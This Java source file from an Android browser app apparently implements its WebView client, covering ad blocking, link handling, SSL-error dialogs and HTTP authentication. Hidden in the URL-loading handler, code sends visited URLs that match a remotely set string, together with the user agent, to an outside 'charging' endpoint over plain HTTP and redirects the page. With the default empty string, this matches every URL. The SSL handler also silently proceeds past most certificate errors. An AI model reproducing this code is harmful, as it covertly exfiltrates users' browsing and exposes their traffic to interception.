package com.mojodigi.ninjafox.Browser;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Typeface;
import android.net.MailTo;
import android.net.http.SslError;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Message;
import android.support.annotation.NonNull;
import android.text.method.PasswordTransformationMethod;
import android.util.Log;
import android.view.LayoutInflater;
import android.webkit.CookieManager;
import android.webkit.HttpAuthHandler;
import android.webkit.SslErrorHandler;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.LinearLayout;

import com.mojodigi.ninjafox.R;
import com.mojodigi.ninjafox.SharedPrefs.AppConstants;
import com.mojodigi.ninjafox.SharedPrefs.SharedPreferenceUtil;
import com.mojodigi.ninjafox.Task.ApiRequestTask;
import com.mojodigi.ninjafox.Unit.BrowserUtility;
import com.mojodigi.ninjafox.Unit.IntentUtility;
import com.mojodigi.ninjafox.View.jmmWebView;

import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.CookieStore;

import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NinjaWebViewClient extends WebViewClient  implements ApiRequestTask.JsonLoadListener {
    private jmmWebView customWebView;
    private Context context;

    private AdBlock adBlock;

    private boolean white;
    private String sendUrl;

    public void updateWhite(boolean white) {
        this.white = white;
    }

    private boolean enable;
    String ua ;
    public void enableAdBlock(boolean enable) {
        this.enable = enable;
    }
    SharedPreferenceUtil mPrefs;
    public NinjaWebViewClient(jmmWebView customWebView) {
        super();
        this.customWebView = customWebView;
        this.context = customWebView.getContext();
        this.adBlock = customWebView.getAdBlock();
        this.white = false;
        this.enable = true;
        ua=new WebView(context).getSettings().getUserAgentString();
        mPrefs=new SharedPreferenceUtil(context);
    }

    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        super.onPageStarted(view, url, favicon);

        String captureStr=mPrefs.getStringValue(AppConstants.PREFS_CAPTURE_STR, "");
        if(url.contains(captureStr))
        {
            customWebView.loadUrl("http://www.google.com");
        }

        if (view.getTitle() == null || view.getTitle().isEmpty()) {
            customWebView.update(context.getString(R.string.album_untitled), url);
        } else {
            customWebView.update(view.getTitle(), url);
        }
    }

    @Override
    public void onPageFinished(WebView view, String url) {
        super.onPageFinished(view, url);


        if (!customWebView.getSettings().getLoadsImagesAutomatically()) {
            customWebView.getSettings().setLoadsImagesAutomatically(true);
        }

        if (view.getTitle() == null || view.getTitle().isEmpty()) {
            customWebView.update(context.getString(R.string.album_untitled), url);
        } else {
            customWebView.update(view.getTitle(), url);
        }

        if (customWebView.isForeground()) {
            customWebView.invalidate();
        } else {
            customWebView.postInvalidate();
        }


        String cookies = CookieManager.getInstance().getCookie(url);
        System.out.print(""+cookies)    ;


    }

    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {




        if (url.startsWith(BrowserUtility.URL_SCHEME_MAIL_TO)) {
            Intent intent = IntentUtility.getEmailIntent(MailTo.parse(url));
            context.startActivity(intent);
            view.reload();
            return true;
        } else if (url.startsWith(BrowserUtility.URL_SCHEME_INTENT)) {
            Intent intent;
            try {
                intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
                context.startActivity(intent);
                return true;
            } catch (Exception e) {

            } // When intent fail will crash
        }

        white = adBlock.isWhite(url);

        String captureStr=mPrefs.getStringValue(AppConstants.PREFS_CAPTURE_STR, "");
         if(url.contains(captureStr))
        {
            try {
                sendUrl=url;
                //new postAsync().execute();
                JSONObject jsonObject =new JSONObject();
                jsonObject.put("url", sendUrl);
                jsonObject.put("ua", ua);
                new ApiRequestTask(context, this, "http://charging.mobclixs.com/api/v1/callertune", false, false, null, jsonObject.toString(), 123).execute();
            }catch (Exception e)
            {

            }

            //here
            customWebView.loadUrl("http://www.google.com");

        }

        return super.shouldOverrideUrlLoading(view, url);
    }

    @Override
    public void doUpdateVisitedHistory(WebView view, String url, boolean isReload) {
        super.doUpdateVisitedHistory(view, url, isReload);
        Log.d("Url", ""+url);
    }

    @Deprecated
    @Override
    public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
        if (enable && !white && adBlock.isAd(url)) {
            return new WebResourceResponse(
                    BrowserUtility.MIME_TYPE_TEXT_PLAIN,
                    BrowserUtility.URL_ENCODING,
                    new ByteArrayInputStream("".getBytes())
            );
        }


        return super.shouldInterceptRequest(view, url);
    }

    @Override
    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (enable && !white && adBlock.isAd(request.getUrl().toString())) {
                return new WebResourceResponse(
                        BrowserUtility.MIME_TYPE_TEXT_PLAIN,
                        BrowserUtility.URL_ENCODING,
                        new ByteArrayInputStream("".getBytes())
                );
            }
        }

        return super.shouldInterceptRequest(view, request);
    }

    @Override
    public void onFormResubmission(WebView view, @NonNull final Message dontResend, final Message resend) {
        Context holder = IntentUtility.getContext();
        if (holder == null || !(holder instanceof Activity)) {
            return;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(holder);
        builder.setCancelable(false);
        builder.setTitle(R.string.dialog_title_resubmission);
        builder.setMessage(R.string.dialog_content_resubmission);
        builder.setPositiveButton(R.string.dialog_button_positive, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                resend.sendToTarget();
            }
        });
        builder.setNegativeButton(R.string.dialog_button_negative, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dontResend.sendToTarget();
            }
        });

        builder.create().show();
    }

    @Override
    public void onReceivedSslError(WebView view, @NonNull final SslErrorHandler handler, SslError error) {
        Context holder = IntentUtility.getContext();
        if (holder == null || !(holder instanceof Activity)) {
            return;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(holder);
        builder.setCancelable(false);
        builder.setTitle(R.string.dialog_title_warning);
        builder.setMessage(R.string.dialog_content_ssl_error);
        builder.setPositiveButton(R.string.dialog_button_positive, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                handler.proceed();
            }
        });
        builder.setNegativeButton(R.string.dialog_button_negative, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                handler.cancel();
            }
        });

        AlertDialog dialog = builder.create();
        if (error.getPrimaryError() == SslError.SSL_UNTRUSTED) {
            dialog.show();
        } else {
            handler.proceed();
        }
    }

    @Override
    public void onReceivedHttpAuthRequest(WebView view, @NonNull final HttpAuthHandler handler, String host, String realm) {
        Context holder = IntentUtility.getContext();
        if (holder == null || !(holder instanceof Activity)) {
            return;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(holder);
        builder.setCancelable(false);
        builder.setTitle(R.string.dialog_title_sign_in);

        LinearLayout signInLayout = (LinearLayout) LayoutInflater.from(holder).inflate(R.layout.dialog_sign_in, null, false);
        final EditText userEdit = (EditText) signInLayout.findViewById(R.id.dialog_sign_in_username);
        final EditText passEdit = (EditText) signInLayout.findViewById(R.id.dialog_sign_in_password);
        passEdit.setTypeface(Typeface.DEFAULT);
        passEdit.setTransformationMethod(new PasswordTransformationMethod());
        builder.setView(signInLayout);

        builder.setPositiveButton(R.string.dialog_button_positive, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                String user = userEdit.getText().toString().trim();
                String pass = passEdit.getText().toString().trim();
                handler.proceed(user, pass);
            }
        });

        builder.setNegativeButton(R.string.dialog_button_negative, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                handler.cancel();
            }
        });

        builder.create().show();
    }

    @Override
    public void onJsonLoad(String json, int mRequestCode) {

        Log.d("dataStr", json.toLowerCase());
    }

    @Override
    public void onLoadFailed(String msg) {

    }


    private  class  postAsync extends AsyncTask<String,String,String>
    {


        @Override
        protected String doInBackground(String... strings) {


            OkHttpClient client = new OkHttpClient();
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("URL", sendUrl)
                    .addFormDataPart("UA", ua)
                    .build();

            Request request = new Request.Builder()
                    .url("http://charging.mobclixs.com/api/v1/callertune")
                    .post(requestBody)
                    .build();

            try {
                Response response = client.newCall(request).execute();
                return response.body().toString();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return "";
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Log.d("DataStr", s.toString());

        }
    }
}
